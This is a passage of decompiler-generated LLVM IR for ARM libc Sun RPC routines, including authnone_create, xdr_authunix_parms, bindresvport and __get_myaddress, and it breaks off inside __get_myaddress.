  %v1_1a3c8 = add i32 %v3_1a3c4, 1
  store i32 %v1_1a3c8, i32* @r4, align 4
  %v1_1a3d0 = call i32 @malloc(i32 %v1_1a3c8)
  store i32 107492, i32* @lr, align 4
  %v1_1a3e0 = icmp ne i32 %v1_1a3d0, 0
  call void @__pseudo_cond_branch(i1 %v1_1a3e0, i32 ptrtoint ([3 x i8]* @global_var_12600.791 to i32))
  %v2_1a3e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a3e8, i32* @r4, align 4
  store i32 %v6_1a3bc, i32* @r5, align 4
  ret i32 %v1_1a3d0
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v1_1a3ec = load i32, i32* @r0, align 4
  ret i32 %v1_1a3ec
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v1_1a400 = load i32, i32* @r0, align 4
  ret i32 %v1_1a400
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1a40c = call i32 @__rpc_thread_variables()
  store i32 %v0_1a40c, i32* %r0.global-to-local, align 4
  %v1_1a410 = add i32 %v0_1a40c, 152
  %v2_1a410 = inttoptr i32 %v1_1a410 to i32*
  %v3_1a410 = load i32, i32* %v2_1a410, align 4
  %v2_1a414 = icmp eq i32 %v3_1a410, 0
  %v0_1a41c = load i32, i32* @r4, align 4
  store i32 %v0_1a41c, i32* %r0.global-to-local, align 4
  br i1 %v2_1a414, label %dec_label_pc_1a43c, label %dec_label_pc_1a428

dec_label_pc_1a428:                               ; preds = %entry
  %v1_1a42c = add i32 %v0_1a41c, 4
  %v2_1a42c = inttoptr i32 %v1_1a42c to i32*
  %v3_1a42c = load i32, i32* %v2_1a42c, align 4
  %v1_1a434 = add i32 %v3_1a42c, 12
  %v2_1a434 = inttoptr i32 %v1_1a434 to i32*
  %v3_1a434 = load i32, i32* %v2_1a434, align 4
  call void @__pseudo_branch(i32 %v3_1a434)
  %v0_1a438 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a43c

dec_label_pc_1a43c:                               ; preds = %entry, %dec_label_pc_1a428
  %v0_1a43c = phi i32 [ 0, %entry ], [ %v0_1a438, %dec_label_pc_1a428 ]
  store i32 %v0_1a43c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1a43c

; uselistorder directives
  uselistorder i32 %v0_1a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1a43c, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v9_1a444 = load i32, i32* @r6, align 4
  %v2_1a448 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1a44c = call i32 @__rpc_thread_variables()
  store i32 %v0_1a44c, i32* %r0.global-to-local, align 4
  store i32 %v0_1a44c, i32* @r4, align 4
  %v1_1a454 = add i32 %v0_1a44c, 152
  %v2_1a454 = inttoptr i32 %v1_1a454 to i32*
  %v3_1a454 = load i32, i32* %v2_1a454, align 4
  store i32 %v3_1a454, i32* @r5, align 4
  %v2_1a458 = icmp eq i32 %v3_1a454, 0
  store i32 64, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v2_1a458, label %dec_label_pc_1a468, label %dec_label_pc_1a47c

dec_label_pc_1a468:                               ; preds = %entry
  %v2_1a468 = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_1a468, i32* @r5, align 4
  %v2_1a46c = icmp eq i32 %v2_1a468, 0
  store i32 %v2_1a468, i32* %r0.global-to-local, align 4
  br i1 %v2_1a46c, label %dec_label_pc_1a500, label %dec_label_pc_1a478

dec_label_pc_1a478:                               ; preds = %dec_label_pc_1a468
  %v1_1a478 = load i32, i32* @r4, align 4
  %v2_1a478 = add i32 %v1_1a478, 152
  %v3_1a478 = inttoptr i32 %v2_1a478 to i32*
  store i32 %v2_1a468, i32* %v3_1a478, align 4
  %v0_1a47c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a47c

dec_label_pc_1a47c:                               ; preds = %entry, %dec_label_pc_1a478
  %v0_1a488 = phi i32 [ %v3_1a454, %entry ], [ %v0_1a47c.pre, %dec_label_pc_1a478 ]
  %v1_1a47c = add i32 %v0_1a488, 60
  %v2_1a47c = inttoptr i32 %v1_1a47c to i32*
  %v3_1a47c = load i32, i32* %v2_1a47c, align 4
  store i32 %v3_1a47c, i32* %r2.global-to-local, align 4
  %v2_1a480 = icmp eq i32 %v3_1a47c, 0
  store i32 ptrtoint (i32* @global_var_302f0.870 to i32), i32* %r0.global-to-local, align 4
  %v1_1a488 = add i32 %v0_1a488, 12
  store i32 %v1_1a488, i32* @r4, align 4
  store i32 %v2_1a448, i32* @r6, align 4
  br i1 %v2_1a480, label %dec_label_pc_1a494, label %.thread

dec_label_pc_1a494:                               ; preds = %dec_label_pc_1a47c
  %v2_1a494 = load i32, i32* @global_var_302f0.870, align 4
  store i32 %v2_1a494, i32* %r0.global-to-local, align 4
  %v5_1a494 = load i32, i32* @global_var_302f4.871, align 4
  store i32 %v5_1a494, i32* %r1.global-to-local, align 4
  %v8_1a494 = load i32, i32* @global_var_302f8.872, align 4
  store i32 %v8_1a494, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ea20.1002 to i32), i32* %ip.global-to-local, align 4
  %v1_1a49c = inttoptr i32 %v1_1a488 to i32*
  store i32 %v2_1a494, i32* %v1_1a49c, align 4
  %v3_1a49c = add i32 %v0_1a488, 16
  %v4_1a49c = inttoptr i32 %v3_1a49c to i32*
  %v5_1a49c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a49c, i32* %v4_1a49c, align 4
  %v6_1a49c = add i32 %v0_1a488, 20
  %v7_1a49c = inttoptr i32 %v6_1a49c to i32*
  %v8_1a49c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a49c, i32* %v7_1a49c, align 4
  %v0_1a4a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a4a0 = load i32, i32* @r5, align 4
  %v2_1a4a0 = add i32 %v1_1a4a0, 32
  %v3_1a4a0 = inttoptr i32 %v2_1a4a0 to i32*
  store i32 %v0_1a4a0, i32* %v3_1a4a0, align 4
  %v0_1a4a4 = load i32, i32* @r5, align 4
  %v1_1a4a4 = inttoptr i32 %v0_1a4a4 to i32*
  %v2_1a4a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1a4a4, i32* %v1_1a4a4, align 4
  %v3_1a4a4 = add i32 %v0_1a4a4, 4
  %v4_1a4a4 = inttoptr i32 %v3_1a4a4 to i32*
  %v5_1a4a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a4a4, i32* %v4_1a4a4, align 4
  %v6_1a4a4 = add i32 %v0_1a4a4, 8
  %v7_1a4a4 = inttoptr i32 %v6_1a4a4 to i32*
  %v8_1a4a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a4a4, i32* %v7_1a4a4, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 %v2_1a448, i32* %r0.global-to-local, align 4
  %v0_1a4b0 = load i32, i32* @r5, align 4
  %v1_1a4b0 = add i32 %v0_1a4b0, 40
  store i32 %v1_1a4b0, i32* %r1.global-to-local, align 4
  %v10_1a4b4 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v1_1a4b0, i32 20, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_1a4b8 = load i32, i32* @r5, align 4
  store i32 %v0_1a4b8, i32* @r1, align 4
  store i32 %v2_1a448, i32* @r0, align 4
  %v0_1a4c0 = call i32 @xdr_opaque_auth()
  %v0_1a4c4 = load i32, i32* @r4, align 4
  store i32 %v0_1a4c4, i32* @r1, align 4
  store i32 %v2_1a448, i32* @r0, align 4
  %v0_1a4cc = call i32 @xdr_opaque_auth()
  store i32 %v2_1a448, i32* %r0.global-to-local, align 4
  %v1_1a4dc = add i32 %tmp, 16
  %v2_1a4dc = inttoptr i32 %v1_1a4dc to i32*
  %v3_1a4dc = load i32, i32* %v2_1a4dc, align 4
  call void @__pseudo_branch(i32 %v3_1a4dc)
  %v1_1a4e0 = load i32, i32* @r5, align 4
  %v2_1a4e0 = add i32 %v1_1a4e0, 60
  %v3_1a4e0 = inttoptr i32 %v2_1a4e0 to i32*
  store i32 %v2_1a448, i32* %v3_1a4e0, align 4
  %v1_1a4e8 = add i32 %tmp, 28
  %v2_1a4e8 = inttoptr i32 %v1_1a4e8 to i32*
  %v3_1a4e8 = load i32, i32* %v2_1a4e8, align 4
  %v2_1a4ec = icmp eq i32 %v3_1a4e8, 0
  store i32 %v2_1a448, i32* %r0.global-to-local, align 4
  br i1 %v2_1a4ec, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1a494
  call void @__pseudo_branch(i32 %v3_1a4e8)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a494, %dec_label_pc_1a47c, %bb
  %v0_1a4fc = load i32, i32* @r5, align 4
  store i32 %v0_1a4fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a500

dec_label_pc_1a500:                               ; preds = %dec_label_pc_1a468, %.thread
  %v14_1a504 = phi i32 [ 0, %dec_label_pc_1a468 ], [ %v0_1a4fc, %.thread ]
  store i32 %v9_1a444, i32* @r6, align 4
  ret i32 %v14_1a504

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32, i32, i32, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32* @global_var_302f0.870, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 152, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1a500, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a47c, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_1a510 = load i32, i32* @r4, align 4
  %v6_1a510 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v0_1a520 = call i32 @xdr_u_long()
  %v2_1a524 = icmp eq i32 %v0_1a520, 0
  br i1 %v2_1a524, label %dec_label_pc_1a59c, label %dec_label_pc_1a538

dec_label_pc_1a538:                               ; preds = %entry
  %v0_1a530 = load i32, i32* @r5, align 4
  %v0_1a52c = load i32, i32* @r4, align 4
  %v1_1a52c = add i32 %v0_1a52c, 4
  %v3_1a538 = inttoptr i32 %v0_1a530 to i32*
  %v4_1a538 = call i32 @__GI_xdr_string(i32* %v3_1a538, i32 %v1_1a52c, i32 255)
  %v2_1a53c = icmp eq i32 %v4_1a538, 0
  %v0_1a540 = load i32, i32* @r4, align 4
  %v1_1a540 = add i32 %v0_1a540, 8
  store i32 %v1_1a540, i32* @r1, align 4
  %v0_1a544 = load i32, i32* @r5, align 4
  store i32 %v0_1a544, i32* @r0, align 4
  br i1 %v2_1a53c, label %dec_label_pc_1a59c, label %dec_label_pc_1a54c

dec_label_pc_1a54c:                               ; preds = %dec_label_pc_1a538
  %v2_1a54c = inttoptr i32 %v0_1a544 to i32*
  %v3_1a54c = inttoptr i32 %v1_1a540 to i32*
  %v4_1a54c = call i32 @xdr_u_int(i32* %v2_1a54c, i32* %v3_1a54c)
  %v2_1a550 = icmp eq i32 %v4_1a54c, 0
  %v0_1a554 = load i32, i32* @r4, align 4
  %v1_1a554 = add i32 %v0_1a554, 12
  store i32 %v1_1a554, i32* @r1, align 4
  %v0_1a558 = load i32, i32* @r5, align 4
  store i32 %v0_1a558, i32* @r0, align 4
  br i1 %v2_1a550, label %dec_label_pc_1a59c, label %dec_label_pc_1a560

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a54c
  %v2_1a560 = inttoptr i32 %v0_1a558 to i32*
  %v3_1a560 = inttoptr i32 %v1_1a554 to i32*
  %v4_1a560 = call i32 @xdr_u_int(i32* %v2_1a560, i32* %v3_1a560)
  %v2_1a564 = icmp eq i32 %v4_1a560, 0
  %v0_1a568 = load i32, i32* @r4, align 4
  br i1 %v2_1a564, label %dec_label_pc_1a59c, label %dec_label_pc_1a57c

dec_label_pc_1a57c:                               ; preds = %dec_label_pc_1a560
  %v0_1a574 = load i32, i32* @r5, align 4
  %v1_1a56c = add i32 %v0_1a568, 20
  %v1_1a568 = add i32 %v0_1a568, 16
  %v6_1a58c = inttoptr i32 %v0_1a574 to i32*
  %v7_1a58c = call i32 @__GI_xdr_array(i32* %v6_1a58c, i32 %v1_1a56c, i32 %v1_1a568, i32 16, i32 4, i32 99228)
  %v2_1a590 = icmp eq i32 %v7_1a58c, 0
  br i1 %v2_1a590, label %dec_label_pc_1a5a0, label %bb

bb:                                               ; preds = %dec_label_pc_1a57c
  br label %dec_label_pc_1a5a0

dec_label_pc_1a59c:                               ; preds = %dec_label_pc_1a560, %dec_label_pc_1a54c, %dec_label_pc_1a538, %entry
  br label %dec_label_pc_1a5a0

dec_label_pc_1a5a0:                               ; preds = %bb, %dec_label_pc_1a57c, %dec_label_pc_1a59c
  %v11_1a5a4 = phi i32 [ 1, %bb ], [ 0, %dec_label_pc_1a57c ], [ 0, %dec_label_pc_1a59c ]
  store i32 %v3_1a510, i32* @r4, align 4
  store i32 %v6_1a510, i32* @r5, align 4
  ret i32 %v11_1a5a4

; uselistorder directives
  uselistorder i32 %v0_1a568, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 ()* @xdr_u_long, { 3, 11, 14, 9, 8, 13, 7, 10, 2, 1, 0, 12, 6, 5, 4 }
  uselistorder label %dec_label_pc_1a5a0, { 2, 0, 1 }
}

define i32 @__GI_bindresvport(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1a5ac = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_1a5b0 = icmp eq i8* %arg2, null
  %v2_1a5b4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v3_1a5b0, label %dec_label_pc_1a5c0, label %dec_label_pc_1a5e0

dec_label_pc_1a5c0:                               ; preds = %entry
  store i32 %v2_1a5b4, i32* @r0, align 4
  store i32 16, i32* @r2, align 4
  %v0_1a5c8 = call i32 @__GI_memset()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_1a5b4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  br label %dec_label_pc_1a608

dec_label_pc_1a5e0:                               ; preds = %entry
  %v2_1a5e0 = load i8, i8* %arg2, align 1
  %v3_1a5e0 = zext i8 %v2_1a5e0 to i32
  store i32 %v3_1a5e0, i32* %r3.global-to-local, align 4
  %v1_1a5e4 = add i32 %tmp, 1
  %v2_1a5e4 = inttoptr i32 %v1_1a5e4 to i8*
  %v3_1a5e4 = load i8, i8* %v2_1a5e4, align 1
  %v4_1a5e4 = zext i8 %v3_1a5e4 to i32
  %v4_1a5e8 = mul nuw nsw i32 %v4_1a5e4, 256
  %v5_1a5e8 = or i32 %v4_1a5e8, %v3_1a5e0
  store i32 %v5_1a5e8, i32* %r3.global-to-local, align 4
  %v7_1a5ec = icmp eq i32 %v5_1a5e8, 2
  br i1 %v7_1a5ec, label %dec_label_pc_1a608, label %dec_label_pc_1a5f4

dec_label_pc_1a5f4:                               ; preds = %dec_label_pc_1a5e0
  %v0_1a5f4 = call i32 @__errno_location()
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_1a600 = inttoptr i32 %v0_1a5f4 to i32*
  store i32 96, i32* %v2_1a600, align 4
  %v0_1a6f4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6f4

dec_label_pc_1a608:                               ; preds = %dec_label_pc_1a5e0, %dec_label_pc_1a5c0
  store i32 ptrtoint (i8** @global_var_30208.1006 to i32), i32* @r4, align 4
  %v3_1a60c = load i8, i8* @global_var_30209.1007, align 1
  %v4_1a60c = zext i8 %v3_1a60c to i32
  %v2_1a610 = load i8, i8* bitcast (i8** @global_var_30208.1006 to i8*), align 4
  %v3_1a610 = zext i8 %v2_1a610 to i32
  %v3_1a614 = mul nuw i32 %v4_1a60c, 16777216
  %v4_1a618 = sdiv i32 %v3_1a614, 65536
  %v5_1a618 = or i32 %v4_1a618, %v3_1a610
  store i32 %v5_1a618, i32* %r3.global-to-local, align 4
  %v7_1a618 = icmp eq i32 %v5_1a618, 0
  br i1 %v7_1a618, label %dec_label_pc_1a620, label %dec_label_pc_1a63c

dec_label_pc_1a620:                               ; preds = %dec_label_pc_1a608
  %v0_1a620 = call i32 @__libc_getpid()
  %v2_1a628 = srem i32 %v0_1a620, 424
  %v1_1a62c = add nsw i32 %v2_1a628, 600
  %v3_1a630 = sdiv i32 %v1_1a62c, 256
  store i32 %v3_1a630, i32* %r3.global-to-local, align 4
  %v1_1a634 = trunc i32 %v3_1a630 to i8
  store i8 %v1_1a634, i8* @global_var_30209.1007, align 1
  %v1_1a638 = trunc i32 %v1_1a62c to i8
  %v2_1a638 = load i32, i32* @r4, align 4
  %v3_1a638 = inttoptr i32 %v2_1a638 to i8*
  store i8 %v1_1a638, i8* %v3_1a638, align 1
  br label %dec_label_pc_1a63c

dec_label_pc_1a63c:                               ; preds = %dec_label_pc_1a608, %dec_label_pc_1a620
  %v0_1a63c = call i32 @__errno_location()
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 98, i32* %r3.global-to-local, align 4
  store i32 %v0_1a63c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_1a650 = inttoptr i32 %v0_1a63c to i32*
  store i32 98, i32* %v2_1a650, align 4
  %v0_1a6bc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6bc

dec_label_pc_1a658:                               ; preds = %dec_label_pc_1a6e8
  %v3_1a658 = load i8, i8* inttoptr (i32 add (i32 ptrtoint (i8** @global_var_30208.1006 to i32), i32 1) to i8*), align 1
  %v4_1a658 = zext i8 %v3_1a658 to i32
  %v2_1a65c = load i8, i8* bitcast (i8** @global_var_30208.1006 to i8*), align 4
  %v3_1a65c = zext i8 %v2_1a65c to i32
  %v4_1a660 = mul nuw nsw i32 %v4_1a658, 256
  %v5_1a660 = or i32 %v3_1a65c, %v4_1a660
  %v1_1a664 = add nuw nsw i32 %v5_1a660, 1
  %v3_1a66c = mul nuw nsw i32 %v3_1a65c, 256
  %v3_1a678 = urem i32 %v1_1a664, 65536
  store i32 %v3_1a678, i32* %ip.global-to-local, align 4
  %v5_1a67c = or i32 %v3_1a66c, %v4_1a658
  store i32 %v5_1a67c, i32* %lr.global-to-local, align 4
  %v3_1a684 = mul i32 %v1_1a664, 65536
  store i32 %v3_1a65c, i32* %r3.global-to-local, align 4
  %v3_1a690 = add i32 %v0_1a6d8, 3
  %v4_1a690 = inttoptr i32 %v3_1a690 to i8*
  store i8 %v2_1a65c, i8* %v4_1a690, align 1
  %v0_1a694 = load i32, i32* %ip.global-to-local, align 4
  %v3_1a694 = sdiv i32 %v0_1a694, 256
  store i32 %v3_1a694, i32* @r4, align 4
  %v5_1a698 = icmp sgt i32 %v3_1a684, 67043328
  br i1 %v5_1a698, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1a658
  store i32 2, i32* %r3.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1a658, %bb
  %v0_1a69c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a69c = trunc i32 %v0_1a69c to i8
  %v2_1a69c = load i32, i32* %r5.global-to-local, align 4
  %v3_1a69c = add i32 %v2_1a69c, 2
  %v4_1a69c = inttoptr i32 %v3_1a69c to i8*
  store i8 %v1_1a69c, i8* %v4_1a69c, align 1
  %v0_1a6a0 = load i32, i32* @r4, align 4
  %v1_1a6a0 = trunc i32 %v0_1a6a0 to i8
  %v2_1a6a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a6a0 = add i32 %v2_1a6a0, 1
  %v4_1a6a0 = inttoptr i32 %v3_1a6a0 to i8*
  store i8 %v1_1a6a0, i8* %v4_1a6a0, align 1
  br i1 %v5_1a698, label %bb25, label %.thread6

.thread6:                                         ; preds = %bb24
  %v0_1a6ac7 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a6ac8 = trunc i32 %v0_1a6ac7 to i8
  %v2_1a6ac9 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a6ac10 = inttoptr i32 %v2_1a6ac9 to i8*
  store i8 %v1_1a6ac8, i8* %v3_1a6ac10, align 1
  br label %bb26

bb25:                                             ; preds = %bb24
  %v6_1a6a4 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a6a4 = trunc i32 %v6_1a6a4 to i8
  %v8_1a6a4 = load i32, i32* %r6.global-to-local, align 4
  %v9_1a6a4 = add i32 %v8_1a6a4, 1
  %v10_1a6a4 = inttoptr i32 %v9_1a6a4 to i8*
  store i8 %v7_1a6a4, i8* %v10_1a6a4, align 1
  %v6_1a6a8 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a6a8 = add i32 %v6_1a6a8, 86
  store i32 %v7_1a6a8, i32* %r3.global-to-local, align 4
  %v0_1a6ac2 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a6ac3 = trunc i32 %v0_1a6ac2 to i8
  %v2_1a6ac4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a6ac5 = inttoptr i32 %v2_1a6ac4 to i8*
  store i8 %v1_1a6ac3, i8* %v3_1a6ac5, align 1
  %v6_1a6b0 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a6b0 = trunc i32 %v6_1a6b0 to i8
  %v8_1a6b0 = load i32, i32* %r6.global-to-local, align 4
  %v9_1a6b0 = inttoptr i32 %v8_1a6b0 to i8*
  store i8 %v7_1a6b0, i8* %v9_1a6b0, align 1
  br label %bb26

bb26:                                             ; preds = %.thread6, %bb25
  %v0_1a6b4 = call i32 @bind()
  store i32 %v0_1a6b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a6bc

dec_label_pc_1a6bc:                               ; preds = %dec_label_pc_1a63c, %bb26
  %v0_1a6bc = phi i32 [ %v0_1a6bc.pre, %dec_label_pc_1a63c ], [ %v0_1a6b4, %bb26 ]
  %tmp27 = icmp slt i32 %v0_1a6bc, 0
  %v3_1a6bc = zext i1 %tmp27 to i32
  %v0_1a6c0 = load i32, i32* %r7.global-to-local, align 4
  %v5_1a6c4 = icmp slt i32 %v0_1a6c0, 424
  %storemerge = select i1 %v5_1a6c4, i32 %v3_1a6bc, i32 0
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1a6cc = icmp eq i32 %storemerge, 0
  store i32 ptrtoint (i8** @global_var_30208.1006 to i32), i32* %r6.global-to-local, align 4
  %v0_1a6d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a6e0 = add i32 %v0_1a6c0, 1
  store i32 %v1_1a6e0, i32* %r7.global-to-local, align 4
  br i1 %v2_1a6cc, label %dec_label_pc_1a6f4, label %dec_label_pc_1a6e8

dec_label_pc_1a6e8:                               ; preds = %dec_label_pc_1a6bc
  %v0_1a6e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a6e8 = inttoptr i32 %v0_1a6e8 to i32*
  %v2_1a6e8 = load i32, i32* %v1_1a6e8, align 4
  store i32 %v2_1a6e8, i32* %r3.global-to-local, align 4
  %v7_1a6ec = icmp eq i32 %v2_1a6e8, 98
  br i1 %v7_1a6ec, label %dec_label_pc_1a658, label %dec_label_pc_1a6f4

dec_label_pc_1a6f4:                               ; preds = %dec_label_pc_1a6e8, %dec_label_pc_1a6bc, %dec_label_pc_1a5f4
  %v0_1a6f4 = phi i32 [ %v0_1a6f4.pre, %dec_label_pc_1a5f4 ], [ %v0_1a6bc, %dec_label_pc_1a6bc ], [ %v0_1a6bc, %dec_label_pc_1a6e8 ]
  store i32 %v3_1a5ac, i32* @r4, align 4
  ret i32 %v0_1a6f4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1a6bc, { 1, 2, 0 }
  uselistorder i32 %v3_1a65c, { 1, 0, 2 }
  uselistorder i32 %v4_1a658, { 1, 0 }
  uselistorder i32 %v3_1a630, { 1, 0 }
  uselistorder i32 %v1_1a62c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 5, 2, 1, 3, 0, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 4, 5, 3, 6, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @bind, { 0, 2, 1 }
  uselistorder i32 98, { 1, 0, 2 }
  uselistorder i32 424, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @__libc_getpid, { 0, 4, 1, 6, 5, 3, 2 }
  uselistorder i8* @global_var_30209.1007, { 1, 0 }
  uselistorder i8** @global_var_30208.1006, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_30208.1006 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 8, 3, 4, 9, 6, 7, 0, 2, 5 }
  uselistorder label %dec_label_pc_1a6bc, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %dec_label_pc_1a63c, { 1, 0 }
}

define i32 @__get_myaddress(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4164 = alloca i32, align 4
  %v3_1a708 = load i32, i32* @r4, align 4
  %v9_1a708 = load i32, i32* @r6, align 4
  %v12_1a708 = load i32, i32* @r7, align 4
  %v15_1a708 = load i32, i32* @r8, align 4
  %v18_1a708 = load i32, i32* @sl, align 4
  store i32 %tmp, i32* @r7, align 4
  %v2_1a718 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a724 = call i32 @socket()
  store i32 %v0_1a724, i32* @r0, align 4
  store i32 %v0_1a724, i32* @r8, align 4
  %v1_1a728 = icmp slt i32 %v0_1a724, 0
  br i1 %v1_1a728, label %.thread, label %dec_label_pc_1a734

.thread:                                          ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_1ea34.1010 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a76c

dec_label_pc_1a734:                               ; preds = %entry
  store i32 4096, i32* %r3.global-to-local, align 4
  %v3_1a73c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v3_1a73c, i32* @lr, align 4
  store i32 35090, i32* %r1.global-to-local, align 4
  %v2_1a74c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1a74c, i32* %r2.global-to-local, align 4
  store i32 4096, i32* %stack_var_-36, align 4
  %v3_1a758 = call i32 @ioctl(i32 %v0_1a724, i32 35090, i32 %v2_1a74c)
  %v1_1a75c = icmp slt i32 %v3_1a758, 0
  br i1 %v1_1a75c, label %dec_label_pc_1a768, label %dec_label_pc_1a7a0.preheader

dec_label_pc_1a7a0.preheader:                     ; preds = %dec_label_pc_1a734
  store i32 1, i32* @sl, align 4
  %v4_1a7e8 = zext i8 %tmp13 to i32
  %v3_1a7f0 = mul nuw i32 %v4_1a7e8, 16777216
  %v4_1a7f4 = sdiv i32 %v3_1a7f0, 65536
  br label %dec_label_pc_1a7a0

dec_label_pc_1a768:                               ; preds = %dec_label_pc_1a734
  store i32 ptrtoint ([53 x i8]* @global_var_1ea4c.1013 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %.thread12, %.thread, %dec_label_pc_1a768
  %v0_1a76c = call i32 @perror()
  %v1_1a774 = call i32 @__GI_exit(i32 1)
  %v0_1a778.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a778

dec_label_pc_1a778:                               ; preds = %bb34, %dec_label_pc_1a76c
